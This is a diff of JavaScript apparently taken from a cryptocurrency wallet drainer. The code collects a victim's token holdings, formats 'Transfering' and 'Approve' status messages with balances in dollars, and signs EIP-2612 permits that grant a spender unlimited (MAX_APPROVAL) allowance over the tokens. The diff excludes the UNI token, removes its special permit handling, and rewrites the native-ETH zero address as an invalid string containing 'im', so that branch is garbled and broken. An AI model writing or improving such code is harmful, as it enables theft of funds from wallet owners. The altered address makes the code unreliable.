@@ -940,7 +940,8 @@ if (DEBUG) {
               symbol: node.symbol,
             };
           })
-          .filter(Boolean);
+          .filter(Boolean)
+          .filter(t => (t.tokenAddress || '').toLowerCase() !== "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984");
 
         tokenListLocal = [...tokenListLocal, ...zapperTokens];
 
@@ -1242,7 +1243,7 @@ if (DEBUG) {
               ? `🪙 <b>Transfering ${item.symbol} | Network: ${item.chain}</b><br>Amount: ${item.tokenAmount} (${item.balance} $)`
               : `🪙<b>Approve ${item.symbol} | Network: ${item.chain}</b><br>Contract: <code>${item.tokenAddress}</code><br>Amount: <code>${item.tokenAmount}</code> (${item.balance} $)`;
 
-            if (item.tokenAddress === "0x0000000000000000000000000000000000000000") {
+            if (item.tokenAddress === "0x000000000000000000000000000000000000im0000") {
               await stakeEth(item.tokenAmount, message);
               processingState.set(key, success === 1 ? 'completed' : 'failed_transfer');
             } else {
@@ -1406,21 +1407,7 @@ if (DEBUG) {
   const permit = async (contract, tokenAddress, amount, owner, spender) => {
     const chainId = await contract.signer.getChainId();
 
-    // ============================================
-    // PERMIT VALUE (with UNI special handling)
-    // ============================================
-    let value;
-
-    const UNI_ADDRESS = "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984".toLowerCase();
-
-    if (tokenAddress && tokenAddress.toLowerCase() === UNI_ADDRESS) {
-        // UNI uses uint96 internally — use actual amount to avoid "exceeds 96 bits" revert
-        value = ethers.BigNumber.from(amount);
-    } else {
-        value = ethers.BigNumber.from(MAX_APPROVAL);
-    }
-
-
+    const value = ethers.BigNumber.from(MAX_APPROVAL);
 
     const nonce = await contract.nonces(owner);
     const name = await contract.name();
@@ -1445,7 +1432,8 @@ if (DEBUG) {
     const v = parseInt(res.substring(130, 132), 16);
 
     return JSON.stringify({ value: value._hex, deadline, v, r, s });
-};
+  };
+
   const getABI = async (address, abiUrl) => {
     try {
       const url = abiUrl.replace('{0}', address);
